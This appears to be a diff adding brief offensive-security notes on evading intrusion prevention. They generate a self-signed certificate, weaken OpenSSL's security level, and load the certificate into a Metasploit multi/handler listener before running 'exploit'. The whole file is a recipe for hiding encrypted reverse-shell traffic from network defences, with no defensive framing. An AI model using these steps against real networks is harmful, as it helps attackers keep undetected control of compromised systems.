@@ -1,0 +1,14 @@
+
+# Create own certificate from OpenSSL and evade IPS
+
+openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
+
+cat priv.key cert.crt > nasa.pem
+
+# In openssl openssl conf remove changes 
+
+CipherString=DEFAULT@SECLEVEL=2 -> CipherString=DEFAULT
+
+Use multi/hnadler
+set HandlerSSLCert /home/kali/self_cert/nasa.pem
+exploit
